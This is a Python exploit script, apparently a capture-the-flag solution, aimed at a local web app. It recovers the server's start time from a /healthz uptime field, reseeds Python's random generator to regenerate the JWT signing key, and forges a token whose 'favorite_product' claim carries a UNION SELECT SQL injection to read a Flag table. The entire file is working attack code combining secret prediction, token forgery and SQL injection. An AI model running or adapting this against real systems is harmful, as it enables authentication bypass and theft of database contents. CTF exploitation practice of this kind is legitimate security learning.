import requests, json, time, math, random, string
import base64
import hmac
import hashlib

URL = "http://localhost:5000/"

s = requests.Session()

def retrieve_secret():
    r = s.get(URL + "healthz")
    return math.floor(time.time() - r.json()["uptime"])

res = [retrieve_secret() for _ in range(10)]
# get the most common value to be sure
secret = max(set(res), key = res.count)

random.seed(secret+ 1) # PID is always gonna be 1 in the docker :)

# random 32 characters
_ = [random.choice(string.printable) for _ in range(32)]
JWT_SECRET_KEY = "".join(random.choice(string.printable) for _ in range(32))
print(secret, JWT_SECRET_KEY)

# modify a JWT token using the secret key

# The JWT token you want to modify - retrieve it using requests.Session or manually
jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNTkxNjM2OSwianRpIjoiNDgyYjhlZWUtYjFlNC00ZmFlLWE0ODctNzFmNDI1ZTE4OTc5IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImEiLCJuYmYiOjE3MzU5MTYzNjksImV4cCI6MTczNTkxNzI2OSwiZmF2b3JpdGVfcHJvZHVjdCI6bnVsbH0.QjIGBNBqPvznilh5VojX1n7GnrK0LMJv74dG070YL7E"

# Split JWT into header, payload, and signature
header, payload, signature = jwt.split(".")

# Base64 decode the payload
payload_bytes = base64.urlsafe_b64decode(payload + "==")
payload_json = json.loads(payload_bytes)

# Modify the payload
payload_json["favorite_product"] = "-1 UNION SELECT 1,1,flag,1,1,1 FROM Flag"

# Re-encode the payload to base64
new_payload = base64.urlsafe_b64encode(json.dumps(payload_json).encode()).decode().replace("=", "")

# Recalculate the signature with the new payload
new_signature = hmac.new(
    key=JWT_SECRET_KEY.encode(),
    msg=f"{header}.{new_payload}".encode(),
    digestmod=hashlib.sha256
).digest()

# Base64 encode the new signature
new_signature_encoded = base64.urlsafe_b64encode(new_signature).decode().replace("=", "")

# Reconstruct the modified JWT
new_jwt = f"{header}.{new_payload}.{new_signature_encoded}"

# Send the new JWT token (assuming session `s` is already set up)
r = s.get(URL + "/favorite_product_info", cookies={"access_token_cookie": new_jwt})
print(r.text)

